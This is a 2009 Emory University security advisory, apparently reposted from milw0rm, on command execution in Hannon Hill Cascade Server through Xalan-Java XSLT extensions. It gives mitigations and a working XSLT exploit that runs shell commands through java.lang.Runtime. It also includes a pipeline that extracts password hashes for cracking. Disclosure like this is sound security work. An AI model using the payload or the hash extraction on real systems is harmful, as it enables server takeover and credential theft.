@@ -1,0 +1,164 @@
+Emory University UTS Security Advisory EMORY-2009-01
+
+Topic: Command Execution in Hannon Hill Cascade Server
+
+Original release date: March 19, 2009
+
+SUMMARY
+=======
+
+Hannon Hill's Cascade Server product is vulnerable to a command
+execution vulnerability. An attacker with access to an unprivileged
+account within Cascade Server could exploit this vulnerability to run
+arbitrary commands on the system with the privileges of the user who
+started Cascade Server.
+
+AFFECTED SOFTWARE
+=================
+
+* Cascade Server, all versions
+
+IMPACT
+======
+
+An attacker with access to an unprivileged account within Cascade
+Server could exploit this vulnerability to run arbitrary commands on
+the system with the privileges of the user who started Cascade Server.
+
+The privileges of that user are necessarily sufficient to gain full
+administrative control of Cascade Server - elevate privileges, conduct
+denial of service, etc. 
+
+DETAILS
+=======
+
+Cascade Server allows its users to write XSLT stylesheets which it
+uses to transform XML source data into HTML or other formats. Cascade
+Server employs the Apache XML Project's Xalan-Java XSLT processor to
+perform these transformations.
+
+The Xalan-Java site states, "For those situations where you would like
+to augment the functionality of XSLT with calls to a procedural
+language, Xalan-Java supports the creation and use of extension
+elements and extension functions... Extensions written in Java are
+directly supported by Xalan-Java."
+
+Because Cascade Server does not restrict the kind of XSLT code users
+are able to enter, any user with access to edit XSLT stylesheets can
+cause Cascade Server to execute arbitrary Java code. Using the
+java.lang.Runtime class, Java can run shell commands.
+
+While the privilege level of the Cascade Server process may prevent
+an attacker from gaining complete control of the host system, that
+privilege level is necessarily sufficient to gain full control of
+Cascade Server.
+
+SOLUTION
+========
+
+No full solution exists at this time, but see Recommendations, below.
+
+Hannon Hill is working to develop an official solution, and customers may
+wish to monitor its progress using the Hannon Hill ticketing system
+(requires a customer account).
+
+http://support.hannonhill.com/browse/CSCD-4753
+
+RECOMMENDATIONS
+===============
+
+It may be possible to limit exposure in the following ways:
+
+* Grant the ability to edit XSLT files only to trusted users.
+
+* Enforce strong passwords for accounts with XSLT editing privileges.
+Cascade stores user passwords as base64 encoded SHA1 hashes in the
+password field of the cxml_user table, and can be audited with any
+SHA1-capable password cracker. For example, to extract hashes from a
+MySQL database in a form useable by John the Ripper's
+(http://www.openwall.com/john/) raw-sha1 format:
+
+echo "select userName, password from cxml_user" \
+ | mysql cascade \
+ | perl -i -ne 'use MIME::Base64; /^(.*?)\t(.*)/ && print "$1:" . unpack("H*", decode_base64($2))."\n"'
+
+* Run Cascade Server as a user with as few privileges as possible.
+
+* On UNIX systems, run Cascade Server in a chroot environment.
+
+EXPLOIT
+=======
+
+This exploit example assumes the ability to create and edit blocks,
+stylesheets, and pages. It's also possible to exploit the
+vulnerability simply by modifying an existing stylesheet.
+
+Create a stylesheet with the following contents:
+
+<?xml version="1.0"?>
+<xsl:stylesheet exclude-result-prefixes="java" version="1.0"
+ xmlns:bufferedreader="xalan://java.io.BufferedReader"
+ xmlns:inputstreamreader="xalan://java.io.InputStreamReader"
+ xmlns:java="http://xml.apache.org/xalan/java"
+ xmlns:process="xalan://java.lang.Process"
+ xmlns:runtime="xalan://java.lang.Runtime"
+ xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
+  <xsl:variable name="runtime" select="runtime:getRuntime()"/>
+  <xsl:template match="//command"> 
+      <xsl:variable name="process" select="runtime:exec($runtime, string(.))"/>
+      <xsl:variable name="inputstream" select="process:getInputStream($process)"/>
+      <xsl:variable name="inputstreamreader" select="inputstreamreader:new($inputstream)"/>
+      <xsl:variable name="bufferedreader" select="bufferedreader:new($inputstreamreader)"/>
+      <p>
+        Output: <xsl:value-of select="bufferedreader:readLine($bufferedreader)"/><br/>
+      </p>
+  </xsl:template>
+</xsl:stylesheet>
+
+Create an XML block with the following contents, substituting your own
+command or commands.
+
+<command>id</command>
+<command>uname -a</command>
+...
+
+Create or edit a page using a template with at least one region defined.
+Under the configuration tab, set Block to point to your XML block and
+Stylesheet (AKA Layout in Cascade 5.7+) to point to your stylesheet.
+
+View the layout or preview tab for that page, and you should see the
+output of your commands. Note that the above stylesheet is only able
+to display the first line of output.
+
+ACKNOWLEDGMENTS
+===============
+
+Thanks to Bradley Wagner and Hannon Hill in general for their quick
+initial response to the problem.
+
+Thanks to Amy Liu and Brett Goodwin of Hannon Hill for their "Advanced
+XSLT" talk at the 2008 Cascade Server User's Conference, which
+inspired this research.
+
+DISCLAIMER
+==========
+
+The information in this advisory is provided by Emory as a courtesy
+and without any representations or warranties.  Recipients are
+advised to conduct their own investigation and due diligence before
+relying on its contents.
+
+VULNERABILTY HISTORY
+====================
+
+2008-10-01  Vulnerability discovered
+            Hannon Hill notified
+            Ticket opened in Hannon Hill issue tracker
+
+2008-10-15  Hannon Hill staff member assigned to the issue
+
+2009-02-23  Hannon Hill staff member reassigned
+
+2009-03-19  Initial revision of advisory published
+
+# milw0rm.com [2009-03-19]
